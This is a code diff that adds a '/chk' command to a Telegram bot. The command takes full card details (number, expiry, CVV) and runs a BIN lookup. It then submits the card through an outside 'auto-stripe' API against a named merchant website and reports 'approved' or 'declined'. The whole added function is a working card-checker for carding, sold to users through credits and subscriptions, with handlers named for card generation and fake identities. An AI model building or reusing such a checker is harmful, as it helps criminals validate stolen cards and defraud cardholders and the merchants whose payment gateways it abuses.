@@ -687,6 +687,155 @@ async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
+import time
+import aiohttp
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.helpers import escape_markdown
+from telegram.ext import ContextTypes
+
+# This function is not needed anymore as we are using standard MarkdownV2
+# formatting and the official escape function.
+# def format_stylish_text(text):
+#     """Converts text to a specific stylish, bolded italic Unicode font."""
+#     # ... (code removed)
+#     return formatted_text
+
+async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Beast /chk: processing box -> BIN lookup + Darkboy API -> edit to final box.
+        Blocks private usage unless authorized, shows subscription message if blocked.
+    """
+    # Block private usage unless authorized
+    if update.effective_chat.type == "private":
+        if not await check_authorization(update, context):
+            return await update.effective_message.reply_text(
+                "❌ Private access is blocked\\.\n"
+                "Contact @YourOwnerUsername to buy subscription\\.",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+
+    user = update.effective_user
+    user_id = user.id
+
+    # Enforce cooldown
+    if not await enforce_cooldown(user_id, update):
+        return
+
+    # Load user data
+    user_data = await get_user(user_id)
+    if user_data.get('credits', 0) <= 0:
+        return await update.effective_message.reply_text(
+            "❌ You have no credits left\\.",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    # Parse card input
+    raw = None
+    if context.args:
+        raw = context.args[0]
+    elif update.effective_message and update.effective_message.text:
+        parts = update.effective_message.text.split(maxsplit=1)
+        raw = parts[1] if len(parts) > 1 else None
+
+    if not raw or "|" not in raw:
+        return await update.effective_message.reply_text(
+            "Usage: /chk number\\|mm\\|yy\\|cvv",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    parts = raw.split("|")
+    if len(parts) != 4:
+        return await update.effective_message.reply_text(
+            "Invalid format\\. Use number\\|mm\\|yy\\|cvv \\(or yyyy for year\\)\\.",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    # Normalize year to 2 digits
+    if len(parts[2]) == 4:
+        parts[2] = parts[2][-2:]
+    cc_normalized = "|".join(parts)
+
+    # BIN lookup
+    bin_number = parts[0][:6]
+    bin_details = await get_bin_details(bin_number)
+    # Handle the case where antipublic.cc returns None
+    if bin_details is None:
+        bin_details = {}
+    brand = (bin_details.get("scheme") or "N/A").upper()
+    issuer = (bin_details.get("type") or "N/A").upper()
+    country_name = (bin_details.get("country_name") or "N/A").upper()
+
+    # Deduct credit
+    if not await consume_credit(user_id):
+        return await update.effective_message.reply_text(
+            "❌ No credits left\\.",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    # Processing box
+    processing_text = (
+        "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
+        f"• 𝘾𝙖𝙧𝙙 ➜ `{cc_normalized}`\n"
+        "• 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
+        "• 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈\\.\\.\\.\n"
+        "═════════════════════"
+    )
+    processing_msg = await update.effective_message.reply_text(
+        processing_text,
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
+
+    start_time = time.time()
+
+    # Darkboy API call
+    api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=25) as resp:
+                if resp.status != 200:
+                    raise Exception(f"HTTP {resp.status}")
+                data = await resp.json()
+    except Exception as e:
+        return await processing_msg.edit_text(
+            f"❌ API Error: `{escape_markdown(str(e), version=2)}`",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+    api_status = (data.get("status") or "Unknown").title()
+    api_response = data.get("response") or "N/A"
+    time_taken = round(time.time() - start_time, 2)
+
+    # Final headers and text with MarkdownV2 for formatting
+    if api_status.lower() == "approved":
+        header = "❖❖❖\\[ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ \\]❖❖❖"
+    elif api_status.lower() == "declined":
+        header = "❖❖❖\\[ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ \\]❖❖❖"
+    else:
+        header = f"❖❖❖\\[ {escape_markdown(api_status, version=2)} \\]❖❖❖"
+    
+    # Use MarkdownV2 italic syntax `_text_` for the response
+    formatted_response = f"_{escape_markdown(api_response, version=2)}_"
+
+    final_text = (
+        f"{header}\n"
+        f"✘ Card        ➜ `{cc_normalized}`\n"
+        "✘ Gateway     ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
+        f"✘ Response    ➜ {formatted_response}\n"
+        "――――――――――――――――\n"
+        f"✘ Brand       ➜ {escape_markdown(brand, version=2)}\n"
+        f"✘ Issuer      ➜ {escape_markdown(issuer, version=2)}\n"
+        f"✘ Country    ➜ {escape_markdown(country_name, version=2)}\n"
+        "――――――――――――――――\n"
+        f"✘ Request By  ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan','Free'), version=2)}\\]\n"
+        "✘ Developer   ➜ kคli liຖนxx\n"
+        f"✘ Time        ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
+        "――――――――――――――――"
+    )
+
+    await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
+
+
+
 from faker import Faker
 
 async def fk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1403,6 +1552,7 @@ def main():
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("info", info))
     application.add_handler(CommandHandler("credits", credits_command))
+    application.add_handler(CommandHandler("chk", chk_command))
     application.add_handler(CommandHandler("gen", gen))
     application.add_handler(CommandHandler("bin", bin_lookup))
     application.add_handler(CommandHandler("fk", fk_command))
